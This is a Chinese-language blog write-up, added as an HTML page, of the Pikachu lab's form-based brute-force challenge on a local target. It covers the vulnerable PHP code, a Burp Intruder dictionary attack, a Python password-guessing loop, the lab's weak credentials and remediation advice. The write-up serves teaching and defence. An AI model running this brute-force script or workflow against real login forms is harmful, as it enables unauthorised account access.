@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pikachu 基于表单的暴力破解 Writeup - gz2008的技术博客</title>
+    <style>
+        body { background: #f6f9fc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif; color: #1e293b; line-height: 1.8; padding: 40px 20px; display: flex; justify-content: center; }
+        .container { max-width: 750px; width: 100%; background: #ffffff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05); padding: 40px; }
+        .back-link { display: inline-block; margin-bottom: 20px; color: #3b82f6; text-decoration: none; font-weight: 500; }
+        .back-link:hover { text-decoration: underline; }
+        h1 { font-size: 2rem; color: #0f172a; margin-bottom: 10px; border-bottom: 2px solid #eef2f6; padding-bottom: 15px; }
+        .tags { margin-bottom: 25px; }
+        .tag { display: inline-block; background: #eff6ff; color: #2563eb; padding: 4px 12px; border-radius: 20px; font-size: 0.85rem; margin-right: 8px; font-weight: 500; }
+        h2 { font-size: 1.4rem; color: #1e293b; margin-top: 30px; margin-bottom: 15px; border-left: 4px solid #3b82f6; padding-left: 10px; }
+        h3 { font-size: 1.1rem; color: #334155; margin-top: 22px; margin-bottom: 10px; }
+        p { margin-bottom: 15px; color: #475569; }
+        ul, ol { margin-left: 20px; margin-bottom: 15px; color: #475569; }
+        li { margin-bottom: 8px; }
+        code { background: #f1f5f9; padding: 2px 6px; border-radius: 4px; font-family: Consolas, monospace; color: #e11d48; font-size: 0.9em; }
+        pre { background: #1e293b; color: #e2e8f0; padding: 15px; border-radius: 8px; overflow-x: auto; font-family: Consolas, monospace; font-size: 0.9em; }
+        table { width: 100%; border-collapse: collapse; margin: 15px 0; font-size: 0.94em; }
+        th, td { border: 1px solid #e2e8f0; padding: 9px 12px; text-align: left; }
+        th { background: #f8fafc; color: #334155; font-weight: 600; }
+        .flag-box { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; padding: 15px; border-radius: 10px; font-weight: 700; font-size: 1.05rem; text-align: center; font-family: Consolas, monospace; margin: 20px 0; word-break: break-all; }
+        .note { background: #fff7ed; border-left: 4px solid #f97316; padding: 12px 16px; border-radius: 6px; color: #9a3412; margin: 18px 0; }
+        .danger { background: #fef2f2; border-left: 4px solid #ef4444; padding: 12px 16px; border-radius: 6px; color: #991b1b; margin: 18px 0; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="index.html" class="back-link">← 返回 Pikachu 首页</a>
+
+        <h1>Pikachu - 暴力破解 - 基于表单的暴力破解</h1>
+
+        <div class="tags">
+            <span class="tag"># Pikachu</span>
+            <span class="tag"># Web</span>
+            <span class="tag"># 暴力破解</span>
+            <span class="tag"># Burp Intruder</span>
+            <span class="tag"># 字典爆破</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>基于表单的暴力破解</li>
+            <li><strong>题目路径：</strong>Pikachu → 暴力破解 → 基于表单的暴力破解</li>
+            <li><strong>题目方向：</strong>Web - 暴力破解（Burte Force）</li>
+            <li><strong>题目环境：</strong>本地部署，PHP 7.4.33 + MariaDB 10.11.19 + PHP 内置服务器</li>
+            <li><strong>访问地址：</strong><code>http://127.0.0.1/pikachu/vul/burteforce/bf_form.php</code></li>
+            <li><strong>题目目标：</strong>绕过登录验证，取得 <code>admin</code> 账号口令。</li>
+        </ul>
+
+        <h2>二、漏洞原理</h2>
+        <p>本题就是一个最朴素的登录表单，提交两个参数：<code>username</code> 与 <code>password</code>。</p>
+        <p>查看源码 <code>vul/burteforce/bf_form.php</code>，登录校验逻辑如下：</p>
+        <pre>if(isset($_POST['submit']) &amp;&amp; $_POST['username'] &amp;&amp; $_POST['password']){
+    $username = $_POST['username'];
+    $password = $_POST['password'];
+    $sql = "select * from users where username=? and password=md5(?)";
+    $line_pre = $link-&gt;prepare($sql);
+    $line_pre-&gt;bind_param('ss',$username,$password);</pre>
+        <p>这里缺失了三项关键防护，构成暴力破解漏洞：</p>
+        <table>
+            <tr><th>防护措施</th><th>是否存在</th><th>后果</th></tr>
+            <tr><td>图形验证码</td><td>否</td><td>可自动化提交，无需人工识别</td></tr>
+            <tr><td>登录失败次数限制 / 账号锁定</td><td>否</td><td>可无限次尝试，无需等待</td></tr>
+            <tr><td>CSRF Token 或其他一次性凭据</td><td>否</td><td>请求可重复重放</td></tr>
+        </table>
+        <div class="note">
+            <strong>注意：</strong>该处 SQL 使用了 <code>prepare</code> 预处理与 <code>bind_param</code> 参数绑定，因此<strong>不存在 SQL 注入</strong>。不要尝试 <code>admin' or '1'='1</code> 一类的注入载荷，本题的唯一突破口就是暴力破解。
+        </div>
+
+        <h2>三、漏洞验证</h2>
+        <p>先用固定用户名、随机密码提交一次，观察响应特征。</p>
+
+        <h3>失败响应</h3>
+        <pre>POST /pikachu/vul/burteforce/bf_form.php HTTP/1.1
+
+username=admin&amp;password=wrongpw&amp;submit=login</pre>
+        <p>返回内容包含：</p>
+        <pre>&lt;p&gt; username or password is not exists～&lt;/p&gt;</pre>
+
+        <h3>成功响应</h3>
+        <p>当凭据正确时，返回内容变为：</p>
+        <pre>&lt;p&gt; login success&lt;/p&gt;</pre>
+
+        <p>两次响应的页面长度差异很小，实测数据如下：</p>
+        <table>
+            <tr><th>结果</th><th>响应特征</th><th>长度（字符）</th></tr>
+            <tr><td>登录成功</td><td><code>login success</code></td><td>35285</td></tr>
+            <tr><td>登录失败</td><td><code>username or password is not exists～</code></td><td>35307</td></tr>
+        </table>
+        <p>两者仅相差 <strong>22 个字符</strong>。在 3 万多字符的页面中，仅凭"响应长度"肉眼比对极易误判，因此后续必须借助关键字匹配来判定结果。</p>
+
+        <h2>四、漏洞利用</h2>
+        <p>使用 Burp Suite Community Edition 的 Intruder 模块完成爆破。整体分为抓包、标记位置、加载字典、设定判定条件、发起攻击五步。</p>
+
+        <h3>4.1 抓取登录请求</h3>
+        <ol>
+            <li>在 Burp 中打开 <strong>Proxy → Intercept</strong>，确认 <code>Intercept is off</code>。</li>
+            <li>点击 <strong>Open browser</strong> 打开 Burp 内置浏览器。</li>
+            <li>访问目标页面，填入 <code>admin</code> 与任意错误密码，点击 Login。</li>
+            <li>回到 Burp，进入 <strong>Proxy → HTTP history</strong>，找到该 POST 请求。</li>
+            <li>右键 → <strong>Send to Intruder</strong>（快捷键 <code>Ctrl+I</code>）。</li>
+        </ol>
+
+        <h3>4.2 标记爆破位置</h3>
+        <p>进入 <strong>Intruder → Positions</strong>，先点 <code>Clear §</code> 清除 Burp 自动添加的全部标记，再单独选中密码值，点 <code>Add §</code> 添加标记。最终请求体应为：</p>
+        <pre>username=admin&amp;password=§123§&amp;submit=login</pre>
+        <p>界面底部应显示 <code>1 payload position</code>，即只有一个爆破位置。</p>
+        <div class="note">
+            因为用户名 <code>admin</code> 已由题目提示给出，此处只爆破密码。若用户名同样未知，可对两个位置同时标记，但请求数会变成两个字典的笛卡尔积，成本急剧上升。
+        </div>
+
+        <h3>4.3 加载字典</h3>
+        <p>切换到 <strong>Payloads</strong> 面板：</p>
+        <ul>
+            <li>Payload type 保持 <code>Simple list</code></li>
+            <li>点击 <code>Load...</code>，选择本地常见口令字典（本项目使用 <code>top1000.txt</code>，共 1000 条）</li>
+            <li>确认 <code>Payload count</code> 显示 1000</li>
+        </ul>
+
+        <h3>4.4 设定成功判定条件</h3>
+        <p>切换到 <strong>Settings</strong> 面板，找到 <strong>Grep - Match</strong> 区域：</p>
+        <ol>
+            <li>勾选 <code>Flag responses matching these expressions</code></li>
+            <li>点击 <code>Add</code>，添加表达式 <code>login success</code></li>
+            <li>Match type 选择 <code>Simple string</code>，不勾选大小写敏感，勾选 <code>Exclude HTTP headers</code></li>
+        </ol>
+        <p>这样 Burp 会在结果表格中新增一列，凡响应正文命中该关键字的行会自动打勾，一眼即可定位成功记录。</p>
+
+        <h3>4.5 发起攻击</h3>
+        <p>点击右上角 <strong>Start attack</strong> 开始爆破。Community 版会弹出限速提示，确认后继续。</p>
+
+        <h2>五、获取结果</h2>
+        <p>攻击结果表格中重点关注 <code>Payload</code>、<code>Length</code> 两列。本次爆破结果片段如下：</p>
+        <table>
+            <tr><th>Request</th><th>Payload</th><th>Status</th><th>Length</th></tr>
+            <tr><td>0</td><td>（空）</td><td>200</td><td>34985</td></tr>
+            <tr><td><strong>1</strong></td><td><strong>123456</strong></td><td>200</td><td><strong>34961</strong></td></tr>
+            <tr><td>2</td><td>password</td><td>200</td><td>34985</td></tr>
+            <tr><td>3</td><td>12345678</td><td>200</td><td>34985</td></tr>
+            <tr><td>4</td><td>qwerty</td><td>200</td><td>34985</td></tr>
+        </table>
+        <p>除第 1 条外，其余响应长度全部为 34985，只有第 1 条为 34961，属于明显的"异类"，即为命中记录。</p>
+
+        <div class="flag-box">
+            username: admin<br>
+            password: 123456
+        </div>
+
+        <p>使用该凭据回到页面登录，页面返回 <code>login success</code>，验证通过。</p>
+
+        <h2>六、批量验证其他账号</h2>
+        <p>同一流程可复用，仅需修改请求体中的 <code>username</code>。本题内置三个用户：</p>
+        <table>
+            <tr><th>用户名</th><th>密码</th><th>字典位置</th></tr>
+            <tr><td>admin</td><td>123456</td><td>第 1 行</td></tr>
+            <tr><td>test</td><td>abc123</td><td>第 13 行</td></tr>
+            <tr><td>pikachu</td><td>000000</td><td>第 33 行</td></tr>
+        </table>
+        <p>三个口令均位于常见口令字典的前 40 行内，说明弱口令在真实场景中的命中率极高。</p>
+
+        <h3>附：脚本化批量验证</h3>
+        <p>除 Burp 外，也可直接使用脚本对同一接口批量尝试，速度更快：</p>
+        <pre>import urllib.parse, urllib.request
+
+URL = "http://127.0.0.1/pikachu/vul/burteforce/bf_form.php"
+
+def try_login(user, pwd):
+    data = urllib.parse.urlencode(
+        {"username": user, "password": pwd, "submit": "login"}
+    ).encode()
+    req = urllib.request.Request(URL, data=data)
+    with urllib.request.urlopen(req, timeout=15) as r:
+        return "login success" in r.read().decode("utf-8", "replace")
+
+for pwd in open("top1000.txt", encoding="utf-8"):
+    pwd = pwd.strip()
+    if pwd and try_login("admin", pwd):
+        print("found:", pwd)
+        break</pre>
+
+        <h2>七、修复建议</h2>
+        <ul>
+            <li><strong>增加图形验证码：</strong>每次登录必须人工识别，直接阻断自动化脚本。</li>
+            <li><strong>限制失败次数：</strong>同一账号连续失败 5 次后锁定 15 分钟，或采用渐进式延迟。</li>
+            <li><strong>按来源限速：</strong>限制同一 IP 单位时间内的登录请求数量。</li>
+            <li><strong>强制口令强度：</strong>禁止 <code>123456</code>、<code>000000</code>、<code>abc123</code> 等弱口令，从源头降低字典命中率。</li>
+            <li><strong>多因素认证：</strong>口令正确后仍需二次验证，即使口令泄露也难以直接登录。</li>
+            <li><strong>统一失败提示：</strong>不要区分"用户名不存在"和"密码错误"，避免用户名枚举。</li>
+        </ul>
+
+        <h2>八、解题总结</h2>
+        <p>本题是暴力破解类漏洞的入门模型，核心判断逻辑可以概括为三点：</p>
+        <ol>
+            <li><strong>有没有验证码？</strong>没有 → 可自动化。</li>
+            <li><strong>有没有失败次数限制或锁定？</strong>没有 → 可无限尝试。</li>
+            <li><strong>有没有一次性 Token？</strong>没有 → 请求可重放。</li>
+        </ol>
+        <p>三者皆无，即构成可被暴力破解的登录接口。本题中 <code>123456</code> 恰好是字典第一行，仅用一次请求便命中，直观说明弱口令与缺乏防护叠加后的风险。</p>
+        <p>实战中还需注意<strong>结果判定方式</strong>：当成功与失败响应长度极为接近时，应使用关键字匹配（Grep - Match）而非肉眼比对长度，否则极易漏判或误判。这也是本题最容易踩坑的一环。</p>
+    </div>
+</body>
+</html>
